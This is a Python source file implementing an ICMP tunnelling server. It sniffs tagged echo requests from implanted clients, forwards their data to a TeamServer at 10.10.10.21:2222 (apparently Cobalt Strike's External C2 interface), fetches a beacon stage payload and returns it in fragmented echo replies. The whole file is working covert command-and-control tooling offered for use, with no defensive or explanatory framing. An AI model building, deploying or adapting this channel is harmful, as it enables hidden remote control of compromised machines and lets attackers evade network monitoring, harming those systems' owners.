import logging
from scapy.all import sniff, send, IP, ICMP, Raw, AsyncSniffer
import struct
import socket
import math
import time
import threading

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(message)s")

ICMP_TAG = "RQ47"
TAG_SIZE = len(ICMP_TAG)
# Must be same as `ICMP_PAYLOAD_SIZE` in client_x86.c, otherwise data will not get through correctly.
ICMP_PAYLOAD_SIZE = 1000
MAX_DATA_PER_CHUNK = ICMP_PAYLOAD_SIZE - TAG_SIZE  # 996

TEAMSERVER_IP = "10.10.10.21"
TEAMSERVER_PORT = 2222
BEACON_PIPENAME = "foobar"
BEACON_ARCH = "x86"  # options: `x86`, `x64`


class Client:
    def __init__(self, client_ip, icmp_id, tag, expected_inbound_data_size=0):
        logging.info(
            f"[+] Listening for transmission of {expected_inbound_data_size} total bytes, "
            f"from {client_ip}, ID={icmp_id}, tag={tag}"
        )
        self.client_ip = client_ip
        self.icmp_id = icmp_id
        self.tag = tag
        self.expected_inbound_data_size = expected_inbound_data_size

        self.server_ip = TEAMSERVER_IP
        self.server_port = TEAMSERVER_PORT

        # data from client. Appended to each packet.
        self.data_from_client = b""
        self.payload = b""

        # need to connect to teamserver RIGHT AWAY
        self.ts_socket_setup()

    def handle_data(self):
        """
        Called each new checkin for the client. Collects all the inbound data, handles comms with teamserver, and sends data back to client.
        """
        # need to make sure this buffer is clear each new checkin
        self.data_from_client = b""

        ######################################################
        # Get the inbound data (post seq 0)
        ######################################################
        self.recv_fragmented_icmp()

        ######################################################
        # Logic/Special Conditions
        ######################################################

        # need to add a special case to get the payload, as when sending payload options, the team server does not reply,
        # meaning that it just hangs there... so we need to do this so the controller can explicitly ask for the payload, then pass it on.
        if self.data_from_client == b"I WANT A PAYLOAD":
            logging.info(
                f"[+] Sending payload to client {self.client_ip} ID={self.icmp_id}"
            )
            self.send_fragmented_icmp(
                client_ip=self.client_ip,
                client_icmp_id=self.icmp_id,
                full_payload=self.get_payload(),
            )
            logging.info(
                f"[+] Payload sent to client {self.client_ip} ID={self.icmp_id}"
            )
            # wipe data after
            return

        ######################################################
        # Proxy
        ######################################################

        # forward onto teamserver
        logging.debug(
            f"[+ PROXY] Forwarding data to TeamServer: {self.data_from_client}"
        )
        self.ts_send_frame(self.data_from_client)

        # Get response from TS
        logging.debug("[+ PROXY] Getting response from TeamServer")
        data_from_ts_for_client = self.ts_recv_frame()

        # send to client
        self.send_fragmented_icmp(
            client_ip=self.client_ip,
            client_icmp_id=self.icmp_id,
            full_payload=data_from_ts_for_client,
            tag=ICMP_TAG.encode(),
        )

    def get_payload(self) -> bytes:
        """
        Get payload from TeamServer
        """
        logging.info(f"[+] Getting Payload from {TEAMSERVER_IP}:{TEAMSERVER_PORT}")
        self.ts_send_frame(f"arch={BEACON_ARCH}".encode())
        self.ts_send_frame(f"pipename={BEACON_PIPENAME}".encode())
        self.ts_send_frame(b"block=100")
        self.ts_send_frame(b"go")
        self.payload = self.ts_recv_frame()
        logging.debug(f"[+] Received payload: {self.payload}")

        if self.payload != b"":
            logging.info(
                f"[+] Payload from {TEAMSERVER_IP}:{TEAMSERVER_PORT} recieved successfully"
            )
        return self.payload

    def send_payload(self):
        """
        Sends payload to client
        """
        if self.payload == b"":
            self.get_payload()

            self.send_fragmented_icmp(
                client_ip=self.client_ip,
                client_icmp_id=self.icmp_id,
                full_payload=self.payload,
            )

    def send_fragmented_icmp(
        self, client_ip, client_icmp_id, full_payload, tag=ICMP_TAG.encode()
    ):
        """
        Fragment `full_payload` into (ICMP_PAYLOAD_SIZE - TAG_SIZE) bytes each,
        and send immediately (no extra wait). The first reply is seq=0 (size),
        then seq=1..N data chunks.
        """
        # 1) Send seq=0 reply with total-size (4 bytes)
        total_size = len(full_payload)
        size_bytes = total_size.to_bytes(4, "big")

        logging.debug(
            f"[*] Sending seq=0 reply to {client_ip} (ID={client_icmp_id}). Total payload={total_size} bytes"
        )
        self.send_icmp_packet(
            ip_dst=client_ip,
            icmp_id=client_icmp_id,
            icmp_seq=0,
            payload=size_bytes,
            tag=tag,
        )

        # 2) Send actual data in (ICMP_PAYLOAD_SIZE - TAG_SIZE) byte chunks
        CHUNK_DATA_SIZE = ICMP_PAYLOAD_SIZE - len(tag)  # e.g. 500 - 4 = 496

        # warning for user when the total size is goingto be bigger than 1 packet
        if total_size > ICMP_PAYLOAD_SIZE:
            logging.warning(
                f"[!] Client {client_ip} ID: {client_icmp_id} is receiving a large transfer, beacon may appear offline while transfering data."
            )

        offset = 0
        seq = 1
        while offset < len(full_payload):
            chunk = full_payload[offset : offset + CHUNK_DATA_SIZE]
            logging.debug(
                f"    → Sending data chunk seq={seq}, data_bytes={len(chunk)}"
            )
            self.send_icmp_packet(
                ip_dst=client_ip,
                icmp_id=client_icmp_id,
                icmp_seq=seq,
                payload=chunk,
                tag=tag,
            )
            offset += CHUNK_DATA_SIZE
            seq += 1
            time.sleep(0.1)

    def recv_fragmented_icmp(self):
        """
        Blocks until we’ve seen exactly self.expected_inbound_data_size bytes
        from (self.client_ip, self.icmp_id, tag=self.tag). Returns the assembled bytes.
        """
        expected_len = self.expected_inbound_data_size
        assembled_data = bytearray()

        max_data_per_chunk = ICMP_PAYLOAD_SIZE - TAG_SIZE  # e.g. 1000 - 4 = 996

        # warning for user when the total size is goingto be bigger than 1 packet
        if expected_len > ICMP_PAYLOAD_SIZE:
            logging.warning(
                f"[!] Client {self.client_ip} ID: {self.icmp_id} is sending back a large transfer, beacon may appear offline while transfering data."
            )

        while len(assembled_data) < expected_len:
            # Wait for the next ICMP Echo-Request from this client/ipc_id/tag
            matching_pkts = sniff(
                filter=f"icmp and src host {self.client_ip}",
                lfilter=lambda p: (
                    p.haslayer(ICMP)
                    and p[ICMP].type == 8
                    and p[ICMP].id == self.icmp_id
                    and p.haslayer(Raw)
                    and p[Raw].load.startswith(self.tag.encode())
                ),
                count=1,
            )
            incoming_pkt = matching_pkts[0]
            raw_load = incoming_pkt[Raw].load
            chunk_data = raw_load[TAG_SIZE:]  # strip off the 4-byte tag

            bytes_needed = expected_len - len(assembled_data)
            chunk_part = chunk_data[:bytes_needed]
            assembled_data += chunk_part

            # For logging
            icmp_seq = incoming_pkt[ICMP].seq & 0xFFFF
            self.data_from_client += chunk_part

            logging.debug(f"[+] Received chunk_data: {chunk_part!r}")
            logging.debug(
                f"[+ SNIFFER] packet seq={icmp_seq} received from {self.client_ip}, "
                f"ID={self.icmp_id}, tag={self.tag}"
            )

        return bytes(assembled_data)

    def send_icmp_packet(
        self, ip_dst, icmp_id, icmp_seq, payload, tag=ICMP_TAG.encode()
    ):
        """
        Always send as an Echo Reply (type 0).
        """
        full_payload = tag + payload
        packet = (
            IP(dst=ip_dst)
            / ICMP(type=0, id=icmp_id, seq=icmp_seq)
            / Raw(load=full_payload)
        )
        send(packet, verbose=False)
        logging.debug(f"[+] Sent ICMP REPLY seq={icmp_seq}, len={len(full_payload)}")

    def ts_recv_frame(self):
        # self.sock.setblocking(False)
        # self.sock.settimeout(2)
        raw_size = self.sock.recv(4)
        # print(raw_size)
        logging.debug(f"Frame coming from TeamServer: {raw_size}")
        if len(raw_size) < 4:
            logging.warning(f"TeamServer: Failed to read frame size: {raw_size}")
            raise ConnectionError("Failed to receive frame size.")
        size = struct.unpack("<I", raw_size)[0]

        buffer = b""
        while len(buffer) < size:
            chunk = self.sock.recv(size - len(buffer))
            if not chunk:
                raise ConnectionError("Socket closed before full frame received.")
            buffer += chunk

        return buffer

    def ts_send_frame(self, data: bytes):
        size = len(data)
        logging.debug(f"Frame going to TeamServer: size: {size} data:{data}")
        self.sock.sendall(struct.pack("<I", size))
        self.sock.sendall(data)

    def ts_socket_setup(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)  # 10 sec timeout
        try:
            self.sock.connect((self.server_ip, self.server_port))
            logging.info(
                f"[+] Connected to TeamServer at {self.server_ip}:{self.server_port}"
            )
        except socket.timeout:
            logging.info(
                f"[!] Socket timed out - is listener up at {self.server_ip}:{self.server_port}?"
            )
            self.sock.close()
            exit()
        except Exception as e:
            logging.info(f"[-] Connection failed: {e}")
            self.sock.close()
            self.sock = None
            exit()


######################################################
# Setup for listener
######################################################
dict_of_clients = {}


def go():
    logging.info("[+] Starting ICMP Listener")
    sniff(filter="icmp", prn=packet_filter, store=0)


def packet_filter(packet):
    """
    Filters initial packets
    """
    # check to make sure packet is correct type, has Raw data
    if not (packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet.haslayer(Raw)):
        return

    raw_load = packet[Raw].load
    # Make sure packet has our tag.
    if not raw_load.startswith(ICMP_TAG.encode()):
        return

    # extract data from packet
    client_ip = packet[IP].src
    icmp_id = packet[ICMP].id & 0xFFFF
    icmp_seq = packet[ICMP].seq & 0xFFFF

    # When we see seq=0, that signals “start of a new transfer”
    if icmp_seq == 0:
        logging.debug(f"[+] New seq=0 packet received from {client_ip}, ID={icmp_id}")

        # Strip off the 4-byte tag (“RQ47”)
        content = raw_load[len(ICMP_TAG) :]  # .rstrip(b"\x00")
        logging.debug(f"[+] seq=0 content: {content}")

        # every other interaction will be here, where it sends a size in seq 0
        expected_inbound_data_size = int.from_bytes(content[:4], "big")
        if expected_inbound_data_size < 0:
            raise ValueError(f"Invalid length={expected_inbound_data_size} in seq=0")

        # if client alreadt in dict, based on id, use that class to handle it
        # problem, this cuold collide if same pid, could just add in ip as well.
        key = icmp_id
        if key in dict_of_clients:
            logging.info(f"[+] Client {client_ip} ID: {icmp_id} checking in")
            new_size = int.from_bytes(raw_load[TAG_SIZE : TAG_SIZE + 4], "big")
            client = dict_of_clients[key]
            # set new expected size for the client to recieve
            client.expected_inbound_data_size = new_size

        else:
            logging.info(f"[+] New Client: {client_ip} ID: {icmp_id}")
            client = Client(
                client_ip=client_ip,
                icmp_id=icmp_id,
                tag=ICMP_TAG,
                expected_inbound_data_size=expected_inbound_data_size,
            )
            dict_of_clients[key] = client

        # client.handle_data()
        # move to threading so more than 1 client can be connected at a time withotut freezing everything up
        # Program should be able to exit and the listeners still run per client due to the daemon setting
        t = threading.Thread(target=client.handle_data, daemon=True)
        t.start()


if __name__ == "__main__":
    go()
